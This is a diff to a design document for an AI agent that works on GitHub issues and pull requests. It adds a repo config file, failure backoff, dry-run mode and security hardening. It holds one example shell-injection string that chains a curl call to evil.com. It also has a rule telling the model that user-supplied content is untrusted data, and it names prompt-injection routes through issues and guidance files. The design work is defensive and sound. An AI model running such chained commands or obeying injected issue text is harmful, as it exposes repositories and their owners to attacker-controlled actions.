@@ -31,6 +31,7 @@ Start
       → Log task=pr_review, pr=#, exit
 
   → [ORCHESTRATOR] Fetch open issues in priority order
+      → Exclude issues labeled `agent:blocked`
       → Exclude issues that already have an open PR with head branch matching agent/issue-{N}-*
       → Unless REQUIRE_ISSUE_ALLOWLIST=false, only consider issues where:
           - the issue author is on the allowlist, OR
@@ -43,16 +44,15 @@ Start
           → [AI: PLAN] Given issue title + body + comments → produce implementation plan
           → If plan exceeds size cap: retry with stricter prompt (max MAX_PLAN_RETRIES times)
           → If still oversized: log task=plan_failed, exit
-          → [ORCHESTRATOR] Post plan as issue comment with marker <!-- agent-plan:cid={comment_id} -->
+          → [ORCHESTRATOR] Post plan as issue comment with marker <!-- agent-plan:hash={content_hash} -->
           → Log task=plan, issue=#, exit
       → If issue has a plan but no matching approval: skip (continue to next issue)
       → If issue has an approved plan:
           → [ORCHESTRATOR] Create branch: agent/issue-{N}-{short-slug}
-          → [ORCHESTRATOR] Fresh clone of repo into WORK_DIR
           → [ORCHESTRATOR] Fetch and rebase from main before starting
           → [AI: IMPLEMENT] Given plan + repo access via tool-use loop → implement solution
           → [ORCHESTRATOR] Rebase from main before push
-          → If merge conflict: abort, delete branch, log task=implement_conflict, exit
+          → If merge conflict: abort, delete branch, increment failure count for this issue (see Failure Backoff), log task=implement_conflict, exit
           → [ORCHESTRATOR] Commit, push branch
           → [ORCHESTRATOR] Open PR (title from issue title; body from template — see PR Format)
           → [AI: REVIEW] Self-review the diff — check for missed requirements, bugs, style issues
@@ -88,6 +88,9 @@ Runs before any GitHub or AI logic. Fails fast with a clear error rather than co
 2. Verify `ANTHROPIC_API_KEY` is set and reachable (lightweight no-op prompt).
 3. Verify `GITHUB_TOKEN` has write access to `GITHUB_REPO` (read repo metadata; check scopes header).
 4. Verify required env vars are present (`GITHUB_REPO`, `GITHUB_BOT_USERNAME`, `WORK_DIR`, `LOG_DIR`).
+5. Clone the repo into `WORK_DIR` (wipe first if exists). Validates network access, credentials, and repo availability in one step. Avoids consuming a full cron slot on triage only to discover the clone fails.
+6. Load repo config from `steward.json` or `.steward.json` at repo root (first found wins). Merge with env var overrides. Apply built-in defaults for any missing keys.
+7. Verify that every command in the `commands` allowlist exists and is executable in the cloned repo environment. A whitelist pointing to a missing test runner is worse than no whitelist — the AI would think tests ran.
 
 Log `task=validation_failed, outcome=error` and exit non-zero if any check fails.
 
@@ -102,7 +105,7 @@ The agent exposes these tools to the AI during the IMPLEMENT and PR FIX phases:
 | `read_file` | Read file contents by path |
 | `write_file` | Write/overwrite a file (auto-creates parent directories) |
 | `list_directory` | Browse repo structure |
-| `run_command` | Run scoped shell commands (linters, test runners, build tools) |
+| `run_command` | Run allowlisted commands via subprocess argv (no shell); AI supplies command name + args as structured list |
 | `search_code` | Search across the codebase |
 | `get_issue_details` | Fetch the current work item's issue + comments |
 | `post_comment` | Post a comment to the current work item's issue or PR |
@@ -116,10 +119,11 @@ The agent exposes these tools to the AI during the IMPLEMENT and PR FIX phases:
 Every AI invocation (PLAN, IMPLEMENT, PR FIX) includes a system prompt assembled by the orchestrator. The prompt contains:
 
 1. **Role and constraints** — agent identity, iteration limits, tool descriptions, formatting expectations.
-2. **Repo-specific guidance** — if `CONTRIB-agents.md` exists at the repo root, the prompt instructs the AI to read it first via `read_file` before starting work. Same for `CONTEXT.md`. The orchestrator checks for these files during clone/setup and conditionally includes the instruction — no wasted tokens if the files don't exist.
+2. **Repo-specific guidance** — the orchestrator reads `CONTRIB-agents.md` and `CONTEXT.md` from the repo root at the script layer (not via AI tool call) and injects their contents as static text in the system prompt under a clear header. The AI never reads these files itself — this eliminates them as a prompt injection vector. If a file doesn't exist, its section is omitted entirely.
 3. **Task payload** — varies by invocation type (issue body + comments for PLAN; approved plan for IMPLEMENT; review threads + diff hunks for PR FIX).
+4. **Untrusted content framing** — all user-supplied content (issue titles, bodies, comments, review threads) is wrapped in clear delimiters (e.g., `<user-content>...</user-content>`) and the system prompt explicitly instructs the AI that content between those delimiters is untrusted data, not instructions to follow. This mitigates prompt injection via issue content.
 
-`CONTRIB-agents.md` is intended for repo owners to provide agent-specific contribution guidelines (e.g., "always run `make lint` before committing", "never modify files under `vendor/`"). `CONTEXT.md` provides general project context (architecture, conventions, key decisions). Both are optional.
+`CONTRIB-agents.md` is intended for repo owners to provide agent-specific contribution guidelines (e.g., "always run `make lint` before committing", "never modify files under `vendor/`"). `CONTEXT.md` provides general project context (architecture, conventions, key decisions). Both are optional. Together with `steward.json` (or `.steward.json`), these three files form the repo-level agent configuration surface.
 
 ### Tool Implementation Notes
 
@@ -129,7 +133,7 @@ Every AI invocation (PLAN, IMPLEMENT, PR FIX) includes a system prompt assembled
 
 **`search_code`:** Executes ripgrep (literal string match by default; regex mode available via a flag in the tool input). Results are truncated at a configurable line limit if the match set is large, with a note indicating truncation.
 
-**`run_command` whitelist + isolation:** Commands are restricted to a configured whitelist (e.g. test runner, linter, build tool). Default Docker network mode is `none`. Set `ALLOW_NETWORK=true` to use bridge mode for repos that require network access during build/test (dep installs, etc.). Explicit opt-in, not the default.
+**`run_command` allowlist + isolation:** Commands are restricted to the `commands` allowlist in the repo config file (e.g. test runner, linter, build tool). **Commands must be executed via subprocess with an argv list, never via a shell string.** The allowlist validates the exact command name, and the orchestrator constructs the argv array — the AI supplies arguments as a structured list in the tool call, not as a freeform string. This prevents shell injection (e.g., `pytest --co -q; curl evil.com` is impossible when there is no shell to interpret the `;`). Default Docker network mode is `none`. Set `ALLOW_NETWORK=true` to use bridge mode for repos that require network access during build/test (dep installs, etc.). Explicit opt-in, not the default.
 
 **`run_command` output truncation:** If output exceeds `CMD_OUTPUT_MAX_TOKENS`, truncate the middle, preserve head and tail, and append: *"Output truncated. Full output saved to `$WORK_DIR/logs/last_command.txt`. Use `read_file` to inspect specific sections."*
 
@@ -183,7 +187,9 @@ gh-agent/
 
 ## Configuration
 
-All configuration via environment variables:
+Configuration is split between **environment variables** (secrets, deployment topology, invocation-time toggles) and a **repo config file** (behavior tuning, access control, command allowlist). The repo config file is the source of truth for repo-specific settings; any key can be overridden by a corresponding env var for deployment flexibility.
+
+### Environment Variables
 
 ```
 # Required
@@ -196,33 +202,83 @@ GITHUB_BOT_USERNAME=                 # used to identify the bot's own comments
 GIT_USER_NAME=                       # used for git commit author (e.g. "My Bot")
 GIT_USER_EMAIL=                      # use GitHub noreply: ID+username@users.noreply.github.com
 
-# Comment filtering
-AGENT_COMMENT_ALLOWLIST=user1,user2  # if set, only these users can trigger work (issues + PR threads)
-AGENT_COMMENT_SKIPLIST=dependabot[bot],github-actions[bot]
-REQUIRE_ISSUE_ALLOWLIST=true         # set false for private repos to process issues from any user
-
-# Safety limits
-MAX_TOOL_ITERATIONS=25               # hard ceiling on AI tool-use loop (IMPLEMENT)
-MAX_PR_FIX_ITERATIONS=10             # lower ceiling for PR FIX tool-use loop
-MAX_PLAN_RETRIES=2                   # max retries if PLAN output exceeds size cap
-MAX_RUNTIME_SECONDS=600              # hard wall-clock limit per run
-MAX_COMMANDS=20                      # max run_command calls per run
-MAX_FILE_WRITES=30                   # max write_file calls per run
-CMD_OUTPUT_MAX_TOKENS=2000           # truncation threshold for run_command output
-
-# GitHub rate limiting
-RATE_LIMIT_THRESHOLD=100             # exit early if GitHub API remaining calls below this
-
-# Issue priority
-PRIORITY_LABEL=priority:high         # label that elevates an issue to top of queue
-
-# Network isolation
+# Docker / runtime environment
+WORK_DIR=/tmp/repo                   # fresh clone target each run; wiped at start of Phase 0
+LOG_DIR=/var/log/gh-agent            # mount a volume here to persist logs
 ALLOW_NETWORK=false                  # set true for repos requiring network during build/test
 
-# Runtime
-WORK_DIR=/tmp/repo                   # fresh clone target each run; wiped at start of each run
-LOG_DIR=/var/log/gh-agent            # mount a volume here to persist logs
+# Invocation-time toggles
+DRY_RUN=false                        # set true to log all actions without any writes
 ```
+
+### Repo Config File
+
+The agent looks for `steward.json` or `.steward.json` at the repo root (checked in that order; first found wins). This file is read by the orchestrator during Phase 0 after the clone. All fields are optional — defaults are applied for any missing key.
+
+```json
+{
+  "allowlist": ["user1", "user2"],
+  "skiplist": ["dependabot[bot]", "github-actions[bot]"],
+  "requireIssueAllowlist": true,
+  "priorityLabel": "priority:high",
+  "commands": ["npm test", "npm run lint"],
+  "rateLimitThreshold": 100,
+  "limits": {
+    "toolIterations": 25,
+    "prFixIterations": 10,
+    "planRetries": 2,
+    "runtimeSeconds": 600,
+    "commands": 20,
+    "fileWrites": 30,
+    "cmdOutputMaxTokens": 2000,
+    "tokensPerRun": null,
+    "issueFailures": 3,
+    "consecutiveFailureThreshold": 3
+  }
+}
+```
+
+| Field | Default | Purpose |
+|---|---|---|
+| `allowlist` | `[]` (no filtering) | Users who can trigger work (issues + PR threads) |
+| `skiplist` | `[]` | Bot/CI users to ignore in PR thread triage |
+| `requireIssueAllowlist` | `true` | Set `false` for private repos to process issues from any user |
+| `priorityLabel` | `"priority:high"` | Label that elevates an issue to top of queue |
+| `commands` | `[]` | Allowlisted commands the AI can run (test runners, linters, build tools) |
+| `rateLimitThreshold` | `100` | Exit early if GitHub API remaining calls below this |
+| `limits.toolIterations` | `25` | Hard ceiling on AI tool-use loop (IMPLEMENT) |
+| `limits.prFixIterations` | `10` | Lower ceiling for PR FIX tool-use loop |
+| `limits.planRetries` | `2` | Max retries if PLAN output exceeds size cap |
+| `limits.runtimeSeconds` | `600` | Hard wall-clock limit per run |
+| `limits.commands` | `20` | Max `run_command` calls per run |
+| `limits.fileWrites` | `30` | Max `write_file` calls per run |
+| `limits.cmdOutputMaxTokens` | `2000` | Truncation threshold for `run_command` output |
+| `limits.tokensPerRun` | `null` (no limit) | Cumulative token ceiling across all AI calls in one run |
+| `limits.issueFailures` | `3` | Consecutive failures before applying `agent:blocked` label |
+| `limits.consecutiveFailureThreshold` | `3` | Consecutive error outcomes before posting alert issue |
+
+**Env var override:** Any repo config key can be overridden by setting a corresponding env var (e.g., `MAX_RUNTIME_SECONDS=300` overrides `limits.runtimeSeconds`). This allows a GitHub Actions workflow to tighten limits for a specific schedule without modifying the repo config. Env var names use the `SCREAMING_SNAKE_CASE` equivalents shown below:
+
+| Repo config key | Env var override |
+|---|---|
+| `allowlist` | `AGENT_COMMENT_ALLOWLIST` (comma-separated) |
+| `skiplist` | `AGENT_COMMENT_SKIPLIST` (comma-separated) |
+| `requireIssueAllowlist` | `REQUIRE_ISSUE_ALLOWLIST` |
+| `priorityLabel` | `PRIORITY_LABEL` |
+| `commands` | `COMMAND_ALLOWLIST` (comma-separated) |
+| `rateLimitThreshold` | `RATE_LIMIT_THRESHOLD` |
+| `limits.toolIterations` | `MAX_TOOL_ITERATIONS` |
+| `limits.prFixIterations` | `MAX_PR_FIX_ITERATIONS` |
+| `limits.planRetries` | `MAX_PLAN_RETRIES` |
+| `limits.runtimeSeconds` | `MAX_RUNTIME_SECONDS` |
+| `limits.commands` | `MAX_COMMANDS` |
+| `limits.fileWrites` | `MAX_FILE_WRITES` |
+| `limits.cmdOutputMaxTokens` | `CMD_OUTPUT_MAX_TOKENS` |
+| `limits.tokensPerRun` | `MAX_TOKENS_PER_RUN` |
+| `limits.issueFailures` | `MAX_ISSUE_FAILURES` |
+| `limits.consecutiveFailureThreshold` | `CONSECUTIVE_FAILURE_THRESHOLD` |
+
+**Resolution order:** env var > repo config file > built-in default.
 
 ---
 
@@ -244,12 +300,13 @@ Each run appends one JSON record to `$LOG_DIR/runs.jsonl`. Log rotation is handl
     "output": 3100,
     "total": 21300
   },
-  "outcome": "success | error | timeout",
-  "error": null
+  "outcome": "success | error | timeout | budget_exceeded",
+  "error": null,
+  "conflict_files": null
 }
 ```
 
-`run_id` is a full UUID (v4) generated at startup, present on every log record. Allows correlation across multi-line output and crash traces. `issue` and `pr` are null when not applicable. Token counts are accumulated across all AI calls within a single run.
+`run_id` is a full UUID (v4) generated at startup, present on every log record. Allows correlation across multi-line output and crash traces. `issue` and `pr` are null when not applicable. Token counts are accumulated across all AI calls within a single run. `conflict_files` is populated only when `task=implement_conflict` — an array of file paths that had merge conflicts, extracted from the rebase output. Essential for debugging recurring conflicts.
 
 ---
 
@@ -278,11 +335,13 @@ Log rotation for `runs.jsonl` is configured here (e.g. logrotate, size cap, or a
 
 ## Plan Approval Flow
 
-1. Agent posts plan comment with marker `<!-- agent-plan:cid={comment_id} -->` where `comment_id` is the GitHub REST API comment ID of the plan comment. Includes note: *"Reply with `agent: approved` to begin implementation."*
-2. On subsequent runs, agent checks for an approval comment containing both `agent: approved` and the matching `cid` value, from a qualifying user (allowlist if configured, otherwise any non-skiplist human).
-3. If the plan comment is edited (GitHub assigns a new comment ID on edit), the prior approval is invalidated and a new one is required.
+1. Agent posts plan comment with marker `<!-- agent-plan:hash={content_hash} -->` where `content_hash` is a SHA-256 hash of the plan body text. Includes note: *"Reply with `agent: approved` to begin implementation."*
+2. On subsequent runs, the agent locates the plan comment, recomputes the hash from the current plan body, and checks for an approval comment containing both `agent: approved` and a matching `hash` value, from a qualifying user (allowlist if configured, otherwise any non-skiplist human).
+3. If the plan comment has been edited, the recomputed hash will differ from the hash in any existing approval. The prior approval is invalid. The agent posts a fresh versioned plan comment with the new hash and a note that the previous plan was superseded, then requires fresh approval. This keeps the audit trail clean — every approved plan is immutable.
 4. If approved: proceed to implementation.
 5. If not approved: skip and continue down the priority queue. Log `task=awaiting_approval` only if every candidate issue is in this state.
+
+**Why content hash, not comment ID:** GitHub comment IDs are stable across edits — editing a comment does not change its ID. A scheme relying on comment ID changes to detect edits would silently fail. The content hash catches any modification to the plan body.
 
 **Plan size cap:** PLAN output is rejected and retried (up to `MAX_PLAN_RETRIES`) with a stricter prompt if it exceeds 200 lines or 8,000 characters. On exhaustion, log `task=plan_failed` and exit. Oversized plans typically indicate the AI is including implementation detail that belongs in code, not the plan.
 
@@ -292,11 +351,16 @@ Log rotation for `runs.jsonl` is configured here (e.g. logrotate, size cap, or a
 
 ## Thread Dedup for PR Review
 
-Before processing any review run, the orchestrator checks for an existing PR comment (posted by `GITHUB_BOT_USERNAME`) containing `agent-processed-threads` with a JSON list of already-handled thread IDs. Threads in this list are skipped even if still technically unresolved in GitHub's API.
+Before processing any review run, the orchestrator builds a set of already-handled thread IDs from two sources:
 
-After all fixes are applied and pushed, the orchestrator upserts this comment with the full updated list.
+1. **PR comment marker:** Check for an existing PR comment (posted by `GITHUB_BOT_USERNAME`) containing `agent-processed-threads` with a JSON list of thread IDs.
+2. **Commit history fallback:** Scan PR commits for messages matching `fix: address N review comment(s) [agent]`. If such commits exist but the dedup comment is missing (e.g., manually deleted), treat those threads as processed.
 
-This prevents double-fixing if a run crashes after push but before logging, or if GitHub's resolved state lags.
+Threads in the combined set are skipped even if still technically unresolved in GitHub's API.
+
+After all fixes are applied and pushed, the orchestrator upserts the dedup comment with the full updated list.
+
+This prevents double-fixing if a run crashes after push but before logging, if GitHub's resolved state lags, or if someone manually deletes the dedup comment.
 
 ---
 
@@ -325,7 +389,71 @@ Format: `agent/issue-{N}-{short-slug}`
 
 ## Work Directory Lifecycle
 
-`WORK_DIR` is wiped and re-cloned fresh at the start of every run. There is no reuse of prior clones. This avoids stale state from previous runs and ensures the agent always works from a clean checkout. The clone happens immediately before the IMPLEMENT phase, not at agent startup.
+`WORK_DIR` is wiped and re-cloned fresh during Phase 0 validation. There is no reuse of prior clones. This avoids stale state from previous runs and ensures the agent always works from a clean checkout. Cloning during Phase 0 (rather than immediately before IMPLEMENT) ensures clone failures — private dependencies, large repo, network timeout — fail fast before the agent spends time on triage.
+
+---
+
+## Failure Backoff for Issues
+
+An issue that repeatedly fails (e.g., persistent merge conflicts, implementation errors) must not block the queue. The agent tracks consecutive failures per issue using GitHub issue labels:
+
+- On any implementation failure (`implement_conflict`, `outcome=error` during IMPLEMENT), the orchestrator checks for existing `agent:failures:N` labels on the issue.
+- Increment the count. If the count reaches `MAX_ISSUE_FAILURES` (default 3), apply the `agent:blocked` label and remove the failure counter labels.
+- Issues labeled `agent:blocked` are skipped during triage until a human removes the label.
+
+This uses GitHub as the state store (consistent with the stateless design) and is visible to humans in the issue sidebar.
+
+---
+
+## Dry-Run Mode
+
+When `DRY_RUN=true`, the agent executes the full loop — triage, plan generation, implementation — but gates all external writes:
+
+- No GitHub comments posted, PRs opened, or branches pushed.
+- No `write_file` calls executed against the repo (AI tool calls are logged but not applied).
+- All actions that would have been taken are logged to `$LOG_DIR/dry-run-{run_id}.json` with full detail: which issue was selected, what plan was generated, what files would have been written, what PR would have been opened.
+
+Essential for testing against a real repo before going live, and for debugging when the agent misbehaves.
+
+---
+
+## Cost Budget Enforcement
+
+`MAX_TOKENS_PER_RUN` (default: configurable, no default — opt-in) sets a cumulative token ceiling across all AI invocations within a single run. The orchestrator tracks input + output tokens after each AI call. If the cumulative total exceeds the limit, the current phase is aborted gracefully: any in-progress work is committed and pushed as partial progress (same as timeout behavior), and the run exits with `outcome=budget_exceeded`.
+
+The log record already includes token counts. Budget enforcement adds a check between AI calls, not a new logging mechanism.
+
+Daily/monthly budget alerting is deferred — the `runs.jsonl` data supports external dashboards and alerts without agent-side logic.
+
+---
+
+## Failure Notifications
+
+If `outcome=error` occurs for `CONSECUTIVE_FAILURE_THRESHOLD` (default 3) consecutive runs, the agent posts a GitHub issue in the target repo titled `[steward] Agent failing — N consecutive errors` with the last N error messages from `runs.jsonl`. This uses the existing GitHub API integration and requires no external notification service.
+
+The issue is tagged `agent:alert` and deduplicated — if an open issue with that tag already exists, the agent appends a comment instead of creating a new issue. The alert issue is closed automatically on the next successful run.
+
+---
+
+## Considered and Deferred
+
+These items were evaluated during design review and intentionally deferred:
+
+**Rollback capability** — An `agent: rollback #PR` trigger that creates a revert commit. Deferred because rollback is a procedural concern handled by existing GitHub UI (revert button) and team workflow, not an agent responsibility. Adding automated rollback introduces risk (reverting the wrong thing) without meaningful time savings.
+
+**CI failure follow-up** — Having the agent watch for CI failures on its own PRs and trigger a follow-up PR FIX run against CI output. Deferred because it's a meaningful scope expansion that requires new state tracking (which PRs are "mine and failing") and introduces a feedback loop between the agent and CI that needs careful design. Worth revisiting after the core loop is proven.
+
+**Branch protection awareness** — Querying branch protection rules in Phase 0 to warn about signed commits, status check requirements, or push restrictions. Deferred because the failure mode is obvious (PR is blocked) and self-diagnosing. Low risk of silent failure.
+
+**Agent memory / learning loop** — A mechanism for the agent to learn from past mistakes on a specific repo (e.g., "last time I touched auth.py I introduced a regression"). Deferred as a future direction. The deterministic orchestration must work reliably first. Designing the log schema and plan comment structure to support future learning is worthwhile; building the learning layer is not yet warranted.
+
+---
+
+## Deployment Model
+
+One Steward instance serves one repo. The command allowlist, `WORK_DIR`, Docker image, and all configuration are scoped to a single repository. A Python repo and a Node repo require two separate Steward instances with different allowlists and potentially different base Docker images.
+
+This is by design — per-repo configuration keeps the agent simple and avoids cross-repo state leakage. Multi-repo orchestration (scheduling multiple Steward instances) is the scheduler's responsibility, not the agent's.
 
 ---
 
@@ -343,8 +471,8 @@ Format: `agent/issue-{N}-{short-slug}`
 | Implementation produces broken code | Linter/tests run at end of tool-use loop; result included in PR description; CI is final gate |
 | AI hallucinates file paths | `read_file` returns similar-file suggestions on miss; `write_file` auto-creates directories |
 | Overlapping runs | Scheduler-level concurrency lock; not handled inside the agent |
-| Double-fixing PR threads | Thread IDs recorded in PR comment after each run; skipped on re-runs |
-| Stale plan approval | Approval tied to plan comment ID; editing the plan invalidates prior approval |
+| Double-fixing PR threads | Thread IDs recorded in PR comment after each run; commit history checked as fallback if dedup comment is deleted |
+| Stale plan approval | Approval tied to content hash of plan body; editing the plan changes the hash, invalidating prior approval |
 | Stuck issue blocking the queue | Issue queue iterated; awaiting-approval issues skipped, not blocking |
 | Old issues starved by new ones | Within priority tier, sort oldest-created first; tie-break by issue number |
 | Oversized plan blowing IMPLEMENT context | Plan capped at 200 lines / 8k chars; retry up to `MAX_PLAN_RETRIES`; log `plan_failed` on exhaustion |
@@ -354,14 +482,19 @@ Format: `agent/issue-{N}-{short-slug}`
 | AI tool accessing wrong issue/PR | `get_issue_details` and `post_comment` scoped to current work item; enforced at tool level |
 | Stale plan implemented after issue edit | Documented behavior: humans must delete approval and re-approve after editing an issue |
 | Untrusted users filing issues on public repos | `REQUIRE_ISSUE_ALLOWLIST=true` by default; gates issue triage to allowlist authors or explicit `agent: consider`; disable for private repos |
-| GitHub comment ID API instability | Using REST API comment IDs, which have been stable; noted as an implementation assumption |
+| Repeatedly-failing issue blocks queue | After `MAX_ISSUE_FAILURES` consecutive failures, apply `agent:blocked` label; skip until human removes it |
+| Shell injection via `run_command` | Commands executed via subprocess argv list, never shell strings; AI supplies arguments as structured list |
+| Prompt injection via repo guidance files | `CONTRIB-agents.md` and `CONTEXT.md` read by orchestrator at script layer, injected as static system prompt text; AI never reads these via tool call |
+| Prompt injection via issue content | All user-supplied content wrapped in `<user-content>` delimiters; system prompt marks content as untrusted data |
+| Missing command in allowlist | Phase 0 validates all allowlisted commands exist and are executable before any work begins |
+| Unnoticed consecutive failures | After N consecutive `outcome=error` runs, agent posts alert issue in target repo; auto-closes on recovery |
 
 ---
 
 ## Phased Build Order
 
 **Phase 0 — Environment validation**
-Startup checks: git, API key reachability, GitHub token scopes, required env vars. Sets the fail-fast pattern used throughout.
+Startup checks: git, API key reachability, GitHub token scopes, required env vars, repo clone, command allowlist validation. Sets the fail-fast pattern used throughout.
 
 **Phase 1 — GitHub plumbing**
 All read operations: fetch PRs, issues, comments, diff hunks, rate limit check, open PR detection by head branch pattern. Validate auth and data shapes against a real repo. No writes yet.
@@ -373,7 +506,7 @@ Wire up the JSON logger (full UUID v4 `run_id`) early so every subsequent phase 
 Issue → plan → comment flow with size cap and retry enforcement. Read-only against the repo itself. Validates the AI integration at low risk.
 
 **Phase 4 — Plan approval and issue selection**
-Approval detection with comment ID matching, queue iteration with skip-on-blocked logic, skiplist/allowlist filtering, oldest-first sort with deterministic tie-breaking.
+Approval detection with content hash matching, queue iteration with skip-on-blocked logic, skiplist/allowlist filtering, oldest-first sort with deterministic tie-breaking, `agent:blocked` label handling.
 
 **Phase 5 — Implementation loop**
 Tool-use agent with filesystem tools against a cloned repo. Implement `write_file` directory creation, `read_file` similar-file fallback, all hard limits, rebase/conflict handling, and timeout behavior. Start with a trivial issue.
@@ -383,3 +516,6 @@ Thread dedup marker, diff context fetching, PR FIX tool loop (shared implementer
 
 **Phase 7 — Docker hardening**
 Finalize base image, `--network none` default, log rotation, end-to-end container test, log volume wiring.
+
+**Phase 8 — Operational features**
+Dry-run mode, cost budget enforcement (`MAX_TOKENS_PER_RUN`), consecutive failure notifications, `agent:blocked` issue labeling on repeated failures.
